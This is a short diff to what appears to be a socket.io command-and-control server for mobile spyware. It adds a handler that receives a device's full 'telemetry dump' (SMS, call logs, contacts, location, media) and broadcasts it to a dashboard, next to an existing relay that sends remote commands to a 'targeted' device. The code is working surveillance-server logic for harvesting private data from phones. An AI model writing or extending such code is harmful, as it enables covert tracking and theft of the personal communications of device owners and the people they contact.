@@ -66,6 +66,12 @@ io.on('connection', (socket) => {
         io.emit('device_status_update', data);
     });
 
+    socket.on('device_telemetry_dump', (data) => {
+        console.log('Received full telemetry dump for device:', data.deviceId);
+        // Broadcast full telemetry dump (SMS, Call Logs, Contacts, Location, Media) to Dashboard
+        io.emit('live_telemetry_dump', data);
+    });
+
     socket.on('send_command', (data) => {
         // Broadcast remote command to targeted mobile device
         io.emit('remote_command', data);
